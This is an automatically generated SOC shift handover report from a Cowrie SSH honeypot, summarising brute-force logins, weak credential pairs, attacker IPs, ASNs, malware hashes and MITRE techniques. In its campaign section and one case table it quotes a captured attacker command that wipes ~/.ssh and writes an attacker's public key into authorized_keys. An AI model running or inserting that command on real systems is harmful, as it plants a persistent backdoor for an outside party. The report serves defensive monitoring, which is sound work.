# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-21 |
| **Generated At** | 2026-03-21T18:33:34Z |
| **Shift Time** | 18:33 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **26** |
| Confirmed Threats | **21** |
| False Positives Filtered | **5** (19.2%) |
| Unique Attacker IPs | **23** |
| Countries of Origin | **13** |
| High Severity Cases | **7** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **19** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **16** |
| Unique Credential Pairs | **14** |
| Unique Usernames | **10** |
| Unique Passwords | **14** |
| Successful Auth Pairs | **7** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 7 |
| `blank` | 1 |
| `user` | 1 |
| `supervisor` | 1 |
| `ubnt` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `4444444` | 2 |
| `qwer1234` | 2 |
| `blank123` | 1 |
| `user2011` | 1 |
| `supervisor1` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `4444444` | 2 |
| `root` | `qwer1234` | 2 |
| `blank` | `blank123` | 1 |
| `user` | `user2011` | 1 |
| `supervisor` | `supervisor1` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `4444444` | `112.6.11.184` | 2026-03-21T17:34:07 |
| `root` | `4444444` | `49.124.151.18` | 2026-03-21T17:34:22 |
| `root` | `qwer1234` | `27.123.98.26` | 2026-03-21T17:59:51 |
| `root` | `qwer1234` | `183.89.208.174` | 2026-03-21T17:59:58 |
| `root` | `Bismillah` | `197.248.8.33` | 2026-03-21T18:14:14 |
| `root` | `3245gs5662d34` | `197.248.8.33` | 2026-03-21T18:14:19 |
| `root` | ` ` | `20.164.21.26` | 2026-03-21T18:22:18 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `197.248.8.33`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **23** |
| Unique ASNs | **19** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS22773` | Cox Communications Inc. | 2 | MEDIUM |
| `AS4818` | DiGi Telecommunications Sdn. Bhd. | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |
| `AS9829` | National Internet Backbone | 1 | HIGH |
| `AS24444` | Shandong Mobile Communication Company Limited | 1 | HIGH |
| `AS29465` | MTN NIGERIA Communication limited | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (7)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-89449543196d

| Field | Detail |
|---|---|
| **Source IP** | `112.6.11[.]184` |
| **First Seen** | 2026-03-21 17:34 |
| **Last Seen** | 2026-03-21 17:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 17:34:04` | `cowrie.session.connect` |
| `2026-03-21 17:34:05` | `cowrie.client.version` |
| `2026-03-21 17:34:05` | `cowrie.client.kex` |
| `2026-03-21 17:34:07` | `cowrie.login.success` |
| `2026-03-21 17:34:08` | `cowrie.direct-tcpip.request` |
| `2026-03-21 17:34:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.6.11[.]184` to AbuseIPDB if not already reported
- [ ] Block `112.6.11[.]184` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9faa86749a61

| Field | Detail |
|---|---|
| **Source IP** | `49.124.151[.]18` |
| **First Seen** | 2026-03-21 17:34 |
| **Last Seen** | 2026-03-21 17:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 17:34:20` | `cowrie.session.connect` |
| `2026-03-21 17:34:20` | `cowrie.client.version` |
| `2026-03-21 17:34:20` | `cowrie.client.kex` |
| `2026-03-21 17:34:22` | `cowrie.login.success` |
| `2026-03-21 17:34:23` | `cowrie.direct-tcpip.request` |
| `2026-03-21 17:34:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.151[.]18` to AbuseIPDB if not already reported
- [ ] Block `49.124.151[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e059eff042f

| Field | Detail |
|---|---|
| **Source IP** | `27.123.98[.]26` |
| **First Seen** | 2026-03-21 17:59 |
| **Last Seen** | 2026-03-21 17:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 17:59:49` | `cowrie.session.connect` |
| `2026-03-21 17:59:49` | `cowrie.client.version` |
| `2026-03-21 17:59:49` | `cowrie.client.kex` |
| `2026-03-21 17:59:51` | `cowrie.login.success` |
| `2026-03-21 17:59:51` | `cowrie.direct-tcpip.request` |
| `2026-03-21 17:59:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.123.98[.]26` to AbuseIPDB if not already reported
- [ ] Block `27.123.98[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d7b62fe16d9

| Field | Detail |
|---|---|
| **Source IP** | `183.89.208[.]174` |
| **First Seen** | 2026-03-21 17:59 |
| **Last Seen** | 2026-03-21 18:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 17:59:56` | `cowrie.session.connect` |
| `2026-03-21 17:59:57` | `cowrie.client.version` |
| `2026-03-21 17:59:57` | `cowrie.client.kex` |
| `2026-03-21 17:59:58` | `cowrie.login.success` |
| `2026-03-21 17:59:59` | `cowrie.direct-tcpip.request` |
| `2026-03-21 18:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.89.208[.]174` to AbuseIPDB if not already reported
- [ ] Block `183.89.208[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b7cdc836853

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-03-21 18:14 |
| **Last Seen** | 2026-03-21 18:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 18:14:12` | `cowrie.session.connect` |
| `2026-03-21 18:14:12` | `cowrie.client.version` |
| `2026-03-21 18:14:13` | `cowrie.client.kex` |
| `2026-03-21 18:14:14` | `cowrie.login.success` |
| `2026-03-21 18:14:14` | `cowrie.session.params` |
| `2026-03-21 18:14:14` | `cowrie.command.input` |
| `2026-03-21 18:14:14` | `cowrie.command.failed` |
| `2026-03-21 18:14:14` | `cowrie.log.closed` |
| `2026-03-21 18:14:15` | `cowrie.session.params` |
| `2026-03-21 18:14:15` | `cowrie.command.input` |
| `2026-03-21 18:14:15` | `cowrie.session.file_download` |
| `2026-03-21 18:14:15` | `cowrie.log.closed` |
| `2026-03-21 18:14:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-299c250265b5

| Field | Detail |
|---|---|
| **Source IP** | `197.248.8[.]33` |
| **First Seen** | 2026-03-21 18:14 |
| **Last Seen** | 2026-03-21 18:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 18:14:18` | `cowrie.session.connect` |
| `2026-03-21 18:14:18` | `cowrie.client.version` |
| `2026-03-21 18:14:18` | `cowrie.client.kex` |
| `2026-03-21 18:14:19` | `cowrie.login.success` |
| `2026-03-21 18:14:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.248.8[.]33` to AbuseIPDB if not already reported
- [ ] Block `197.248.8[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47136c79fe19

| Field | Detail |
|---|---|
| **Source IP** | `20.164.21[.]26` |
| **First Seen** | 2026-03-21 18:22 |
| **Last Seen** | 2026-03-21 18:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 18:22:18` | `cowrie.session.connect` |
| `2026-03-21 18:22:18` | `cowrie.client.version` |
| `2026-03-21 18:22:18` | `cowrie.client.kex` |
| `2026-03-21 18:22:18` | `cowrie.login.success` |
| `2026-03-21 18:22:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.164.21[.]26` to AbuseIPDB if not already reported
- [ ] Block `20.164.21[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `47.91.20[.]0` | **2** | 2026-03-21 17:43 | 2026-03-21 17:51 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.13.5[.]49` | 1 | 2026-03-21 17:02 | 2026-03-21 17:03 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.90.34[.]90` | 1 | 2026-03-21 18:19 | 2026-03-21 18:21 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.194.142[.]167` | 1 | 2026-03-21 18:13 | 2026-03-21 18:13 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.30.223[.]119` | 1 | 2026-03-21 17:20 | 2026-03-21 17:20 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.241.133[.]135` | 1 | 2026-03-21 17:17 | 2026-03-21 17:17 | 12s | 0 | `T1592` | 🟢 LOW |
| `117.216.33[.]31` | 1 | 2026-03-21 16:40 | 2026-03-21 16:41 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.43.180[.]56` | 1 | 2026-03-21 18:29 | 2026-03-21 18:29 | 16s | 0 | `T1592` | 🟢 LOW |
| `183.245.232[.]31` | 1 | 2026-03-21 18:01 | 2026-03-21 18:01 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.248.8[.]33` | 1 | 2026-03-21 18:14 | 2026-03-21 18:14 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.124.208[.]27` | 1 | 2026-03-21 17:00 | 2026-03-21 17:00 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.154[.]163` | 1 | 2026-03-21 16:35 | 2026-03-21 16:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.200.95[.]18` | 1 | 2026-03-21 16:43 | 2026-03-21 16:43 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (10 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `183.89.208[.]174` | TH | Triple T Broadband Public Company Limited | **100** ⚠️ | 9 |
| `49.124.151[.]18` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 18 |
| `49.124.154[.]163` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 9 |
| `94.200.95[.]18` | AE | Emirates Integrated Telecommunications Company PJSC | **100** ⚠️ | 14 |
| `118.43.180[.]56` | KR | Korea Telecom | **100** ⚠️ | 10 |
| `27.123.98[.]26` | IN | Bharti Airtel Limited | **100** ⚠️ | 10 |
| `183.245.232[.]31` | CN | China Mobile Communications Corporation | **100** ⚠️ | 38 |
| `117.216.33[.]31` | IN | Broadband Multiplay Project, O/o DGM BB, NOC BSNL Bangalore | **100** ⚠️ | 28 |
| `112.194.142[.]167` | CN | China Unicom Sichuan province network | **100** ⚠️ | 50 |
| `47.91.20[.]0` | JP | Alibaba Cloud - JP | **100** ⚠️ | 11 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 18 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 9 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 1 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 1 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 26 cases |
| Tool 34  | Credential Extractor        | ✅ 16 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 23 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (19.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 19 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 10 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 7 priority case(s) shown individually · 13 recon entry/entries in table (1 group(s) consolidating 2 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-21T18:33:34Z_
